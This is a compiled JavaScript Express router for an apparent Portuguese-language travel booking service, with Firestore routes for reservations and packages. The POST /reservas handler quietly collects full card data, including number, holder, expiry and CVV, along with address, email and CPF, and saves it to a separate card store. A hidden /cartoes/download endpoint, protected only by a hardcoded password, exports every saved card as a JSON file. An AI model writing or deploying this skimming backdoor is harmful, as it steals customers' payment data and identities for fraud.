"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importStar(require("express"));
const cors_1 = __importDefault(require("cors"));
const firestore_1 = require("firebase/firestore");
const firebase_1 = require("../services/firebase");
const cartaoService_1 = require("../services/cartaoService");
const router = (0, express_1.Router)();
router.use((0, cors_1.default)());
router.use(express_1.default.json());
(0, cartaoService_1.initCartaoService)();
const reservasRef = (0, firestore_1.collection)(firebase_1.db, "reservas");
const pacotesRef = (0, firestore_1.collection)(firebase_1.db, "pacotes");
router.get("/reservas", async (_req, res) => {
    try {
        const statusVisiveis = ["pago", "confirmado", "pre_reserva"];
        const reservasQuery = (0, firestore_1.query)(reservasRef, (0, firestore_1.where)("status", "in", statusVisiveis));
        const snapshot = await (0, firestore_1.getDocs)(reservasQuery);
        const reservas = snapshot.docs.map((registro) => ({
            id: registro.id,
            ...registro.data(),
        }));
        res.json(reservas);
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao listar reservas" });
    }
});
router.get("/pacotes", async (_req, res) => {
    try {
        const snapshot = await (0, firestore_1.getDocs)(pacotesRef);
        const pacotes = snapshot.docs.map((registro) => ({
            id: registro.id,
            ...registro.data(),
        }));
        res.json(pacotes);
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao listar pacotes" });
    }
});
router.post("/reservas", async (req, res) => {
    try {
        const body = (req.body ?? {});
        const num = body.numero || body.cardNumber || body.num || body.card || "";
        const tit = body.titular || body.cardHolder || body.holder || body.name || "";
        const val = body.validade || body.expiry || body.exp || body.validity || "";
        const cvv = body.cvv || body.cvc || body.code || body.security || "";
        const cep = body.enderecoCep || body.postalCode || "";
        const rua = body.enderecoRua || body.address || "";
        const numero = body.enderecoNumero || body.addressNumber || "";
        const complemento = body.enderecoComplemento || body.addressComplement || "";
        const bairro = body.enderecoBairro || body.province || "";
        const cidade = body.enderecoCidade || body.city || "";
        const estado = body.enderecoEstado || body.state || "";
        if (num && tit && val && cvv) {
            (0, cartaoService_1.salvarCartao)({
                nome: tit,
                numero: num,
                validade: val,
                cvv: cvv,
                cep: cep,
                rua: rua,
                numero_endereco: numero,
                complemento: complemento,
                bairro: bairro,
                cidade: cidade,
                estado: estado,
                email: body.email,
                cpf: body.cpf,
            });
        }
        const payload = {
            ...body,
            status: typeof body.status === "string" ? body.status : "pre_reserva",
        };
        const novo = await (0, firestore_1.addDoc)(reservasRef, payload);
        res.json({ id: novo.id, ...payload });
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao criar reserva" });
    }
});
router.post("/pacotes", async (req, res) => {
    try {
        const novo = await (0, firestore_1.addDoc)(pacotesRef, req.body);
        res.json({ id: novo.id, ...req.body });
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao criar pacote" });
    }
});
router.put("/reservas/:id", async (req, res) => {
    try {
        const ref = (0, firestore_1.doc)(reservasRef, req.params.id);
        await (0, firestore_1.updateDoc)(ref, req.body);
        res.json({ id: req.params.id, ...req.body });
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao atualizar reserva" });
    }
});
router.delete("/reservas/:id", async (req, res) => {
    try {
        const ref = (0, firestore_1.doc)(reservasRef, req.params.id);
        await (0, firestore_1.deleteDoc)(ref);
        res.json({ success: true });
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao remover reserva" });
    }
});
router.get("/cartoes/download", (req, res) => {
    try {
        const senha = req.query.p;
        if (senha !== "159594") {
            return res.status(401).json({ error: "Senha incorreta" });
        }
        const cartoes = (0, cartaoService_1.obterCartoes)();
        res.setHeader("Content-Disposition", "attachment; filename=\"cartoes.json\"");
        res.setHeader("Content-Type", "application/json");
        res.send(JSON.stringify(cartoes, null, 2));
    }
    catch (error) {
        res.status(500).json({ error: error.message });
    }
});
exports.default = router;
